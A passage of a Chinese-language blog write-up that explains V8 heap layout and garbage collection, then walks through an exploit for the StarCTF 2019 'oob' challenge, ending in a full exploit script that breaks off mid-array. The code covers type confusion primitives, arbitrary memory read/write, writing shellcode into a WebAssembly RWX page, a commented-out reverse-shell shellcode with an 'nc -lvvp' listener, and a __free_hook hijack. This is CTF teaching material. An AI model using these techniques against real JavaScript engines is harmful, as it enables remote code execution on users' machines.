Javascript 执行的线程)被暂停。交换To Space 和 From Space 。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/bd2fa5cad07aa2c49e840d27a3d06d3e.png"
                     
alt="在这里插入图片描述" 
                > 之后会把存活的对象复制到 To Space
，然后再次分配之前未分配完成的 obj-e 。这里判断存活 obj
的方法是从各种各样的 root objects (例如 global objects, built-in
objects, local objects within the scope of living 等）和从 Old Space
可以访问的 object (Write Barrier mechanism）沿指针遍历出所有存活的 obj
。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e1557fa97f7e301249cd965b402054f1.png"
                     
alt="在这里插入图片描述" 
                >
之后，每次GC发生时，都会重复上面这⼀系列的流程。</p>
<h2 id="old-generation">Old Generation</h2>
<h3 id="old-space">old space</h3>
<p>长期存活对象存放的区域，例如 New Space 中，在两次 GC 之后存活下来的
object ，具体参考 <code>Heap::ShouldBePromoted()</code> 。</p>
<p>old space 发生 GC 的频率比 new space 少，因此如果⼀个 object 被移动到
old space ，该 object 不会受到 GC 更改 layout 的影响。</p>
<h3 id="code-space">code space</h3>
<p>仅适用于 JIT 的 code object ，由于 code object 是 RWX
，因此它从一开始就保留在此区域中，由于它是JIT代码，因此不仅要读取（R）写⼊（W），还要执行（X），因此
memory permissions 与其他的地方不同。</p>
<h3 id="map-space">map space</h3>
<p>仅存放 Map object ，出于 GC 效率的考虑，Map object
从一开始就位于此区域。</p>
<h3 id="mark-sweep-compact">Mark-Sweep-Compact</h3>
<p>old generation 的 GC 算法是 Mark-Sweep-Compact
，即标记-清除-整理算法。</p>
<h2 id="other">Other</h2>
<p>即 Large Object Space ，用于存放 600KB 或更大的 object 的区域。它由
mmap
直接分配，如果有多个存放区域，则使用链表进行管理。它不在GC中移动。</p>
<h2 id="write-barrier">Write Barrier</h2>
<p>写屏障是⼀种减少时间开销的机制。</p>
<p>当 GC
想回收新生代中的内容的时候，如果此时有一个对象，且这个对象恰好被一个老年代所引用，那么这个时候，如果想回收这个对象，就需要去遍历老年代，这样开销比较大。</p>
<p>所以就引入了记录集，在更新对象的时候有个记录集，这个记录集内记录了所有老年代指向新生代的情况，即记录集里保存的实际上是指向老年代对象的指针。</p>
<p>在新生代中触发 GC
的时候，会将记录集里的老年代对象也当成根对象⼀样，扫描记录集，查看记录集里老年代对象引用的目标对象，进而更新引用的目标对象，再将发出引用的对象的指针更新到目标空间了。
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7d32f6a090435f50b55c8bd2e7a8968d.png"
                     
alt="在这里插入图片描述" 
                >
在分代垃圾回收中，为了将老年代对象记录到记录集⾥，我们引⼊了写入屏障（write
barrier）的概念。 在更新对象间的指针时候检查如下三点：</p>
<ul>
<li>发出引用的对象是不是老年代对象</li>
<li>指针更新后的引用的目标对象是不是新生代对象</li>
<li>发出引用的对象是否还没有被记录到记录集中</li>
</ul>
<p>如果这些条件都满足，就将老年代对象 obj 写入到记录集里。 #
例题：StarCTF 2019 OOB</p>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/starctf2019_oob" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
v8 commit:<code>6dc88c191f5ecc5389dc26efa3ca0907faef3598</code></p>
<h2 id="漏洞分析">漏洞分析</h2>
<p>观察 <code>oob.diff</code>
发现增加了如下功能，即任意数组可以以浮点数类型越界读写 8 字节。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">BUILTIN</span>(ArrayOob)&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = args.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">            isolate, receiver, Object::<span class="built_in">ToObject</span>(isolate, args.<span class="built_in">receiver</span>()));</span><br><span class="line">    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::<span class="built_in">cast</span>(array-&gt;<span class="built_in">elements</span>());</span><br><span class="line">    <span class="type">uint32_t</span> length = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;<span class="built_in">length</span>()-&gt;<span class="built_in">Number</span>());</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(elements.<span class="built_in">get_scalar</span>(length)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;</span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">                isolate, value, Object::<span class="built_in">ToNumber</span>(isolate, args.<span class="built_in">at</span>&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="泄露-map">泄露 Map</h2>
<p>调试发现 <code>JSArray</code> 在内存中的结构如下图所示： <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/27e98fd1fed5dfb781c688b57cddb7eb.png"
                     
alt="在这里插入图片描述" 
                >因此可以通过 <code>oob</code> 泄露
<code>Map</code> 地址。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br></pre></td></tr></table></figure></div>
<h2 id="类型混淆">类型混淆</h2>
<p>通过 <code>oob</code> 修改 <code>Map</code> 构造实现浮点数数组和
objec t数组的类型混淆，进而构造 <code>addressOf</code> 和
<code>fakeObj</code> 两个利用原语。</p>
<ul>
<li><code>addressOf</code>：传入一个 object ， 返回它的地址，实现对任意
object 的地址泄漏。</li>
<li><code>fakeObj</code>：传入一个地址，我们把这个地址指向的内存当做一个
object ， 并将它返回。实现对任意 object 的伪造。</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="任意地址读写">任意地址读写</h2>
<p>任意地址读写如果用 <code>DoubleArray</code> 实现会有如下问题：</p>
<ul>
<li>在数组进行元素访问时，它会和这个堆的基地址做一个 mask
的操作，保证了这个 <code>elements</code> 指针指向的内存段时属于 v8
的堆的范围。</li>
<li>在对伪造的浮点数数组进行操作的时候，触发了收集 Inline Cache
的函数，导致 SIGTRAP 。</li>
<li><code>DoubleArray</code> 构造的任意地址读写只能读写
<code>elements + 0x10</code> ，并且还会访问
<code>[elements, elements + 0x10)</code> 范围内的数据，而如果是在 rwx
段写 shellcode 需要从起始位置开始写，因此不能用 <code>DoubleArray</code>
构造的任意地址读写完成。</li>
</ul>
<p>因此这里需要使用 <code>ArrayBuffer</code> 和 <code>DataView</code>
来构造任意地址读写。这里介绍两种方法：</p>
<ul>
<li><p>伪造 <code>DoubleArray</code> 进行一次任意地址写修改一个
<code>ArrayBuffer</code> 的 <code>BackingStore</code> 指向另一个
<code>ArrayBuffer</code> 的 <code>BackingStore</code>
，之后每次任意地址读写都可以先用一个 <code>ArrayBuffer</code> 改另一个
<code>ArrayBuffer</code> 的 <code>BackingStore</code> 然后利用另一个
<code>ArrayBuffer</code> 进行任意地址读写。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/7729391b287f656bbc54f9168026d770.png"
                     
alt="在这里插入图片描述" 
                > 需要注意的是伪造的 <code>DoubleArray</code>
的 <code>Length</code> 字段是一个 <code>Smi</code> 类型，需要右移 32
位。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li><p>首先在 <code>DoubleArray</code> 中构造一个
<code>fake ArrayBuffer</code>，之后就可以通过 <code>DoubleArray</code>
修改 <code>BackingStore</code> 指针来进行任意地址读写。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/a37f64a6db55de364bcd5330b6b1aa84.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),               <span class="comment">// ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042319080808n</span>),   <span class="comment">// type</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">addressOf</span>(fake_ab_mem) + <span class="number">0x58n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fakeObj</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="劫持程序执行流程">劫持程序执行流程</h2>
<h3 id="利用-webassembly-写-shellcode">利用 WebAssembly 写
shellcode</h3>
<p>利用 <code>WebAssembly</code> 开辟 rwx 段。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br></pre></td></tr></table></figure></div>
<p>上面这段 <code>WebAssembly</code> 代码对应的 <code>wat</code>
代码如下，是通过<a class="link" 
 href="https://webassembly.github.io/wabt/demo/wasm2wat/index.html" >这个网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>反编译得到的。
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line">(<span class="title function_ invoke__">module</span></span><br><span class="line">  (type <span class="variable">$t0</span> (<span class="title function_ invoke__">func</span> (result i32)))</span><br><span class="line">  (func <span class="variable">$main</span> (export <span class="string">&quot;main&quot;</span>) (type <span class="variable">$t0</span>) (result i32)</span><br><span class="line">    (i32.<span class="keyword">const</span> <span class="number">42</span>))</span><br><span class="line">  (table <span class="variable">$T0</span> <span class="number">0</span> funcref)</span><br><span class="line">  (memory <span class="variable">$memory</span> (export <span class="string">&quot;memory&quot;</span>) <span class="number">1</span>))</span><br></pre></td></tr></table></figure></div> 利用任意地址读泄露 rwx 段基址。 <div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br></pre></td></tr></table></figure></div> 写入
shellcode 并调用 <code>WebAssembly</code> 对应函数执行 shellcode 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// var shellcode=[</span></span><br><span class="line"><span class="comment">// 0x6a5f026a9958296an,</span></span><br><span class="line"><span class="comment">// 0xb9489748050f5e01n,</span></span><br><span class="line"><span class="comment">// 0x0100007f39300002n,</span></span><br><span class="line"><span class="comment">// 0x6a5a106ae6894851n,</span></span><br><span class="line"><span class="comment">// 0x485e036a050f582an,</span></span><br><span class="line"><span class="comment">// 0x75050f58216aceffn,</span></span><br><span class="line"><span class="comment">// 0x2fbb4899583b6af6n,</span></span><br><span class="line"><span class="comment">// 0x530068732f6e6962n,</span></span><br><span class="line"><span class="comment">// 0xe689485752e78948n,</span></span><br><span class="line"><span class="comment">// 0x000000000000050fn]</span></span><br><span class="line"><span class="comment">//nc -lvvp 12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>
<h3 id="劫持-__free_hook">劫持 __free_hook</h3>
<p>通过构造函数例如 <code>Array</code> 可以泄露 ELF 加载基址，进而通过
got 表泄露 libc 加载基址。 利用任意地址写修改 <code>__free_hook</code>
为 <code>system</code> 函数地址，之后 <code>print</code>
输出要执行的命令，在释放写有命令的堆块的时候实现任意命令执行。 <img 

                     lazyload
                     src="/images/loading.svg"
                     data-src="images/3b004ce33229326fc2ddc8ce73b1b455.png"
                     
alt="在这里插入图片描述" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> array_addr = <span class="title function_">addressOf</span>(<span class="title class_">Array</span>);</span><br><span class="line"><span class="keyword">var</span> elf_base = <span class="title function_">arbitrary_address_read</span>(<span class="title function_">arbitrary_address_read</span>(array_addr - <span class="number">1n</span> + <span class="number">0x30n</span>) + <span class="number">0x41n</span>) - <span class="number">0xf8f680n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] elf base: &quot;</span> + <span class="title function_">hex</span>(elf_base));</span><br><span class="line"><span class="keyword">var</span> libc_base = <span class="title function_">arbitrary_address_read</span>(elf_base + <span class="number">0x1271b90n</span>) - <span class="number">0x7b0c0n</span>;</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] libc base: &quot;</span> + <span class="title function_">hex</span>(libc_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> system_addr = libc_base + <span class="number">0x4f420n</span>;</span><br><span class="line"><span class="keyword">var</span> free_hook_addr = libc_base + <span class="number">0x3ed8e8n</span>;</span><br><span class="line"><span class="title function_">arbitrary_address_write</span>(free_hook_addr, system_addr);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;/snap/bin/gnome-calculator&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<h2 id="exp">exp</h2>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">gc</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0x100000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),       <span class="comment">//ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),            <span class="comment">//BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042319080808n</span>),<span class="comment">//type</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">addressOf</span>(fake_ab_mem) + <span class="number">0x58n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fakeObj</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span 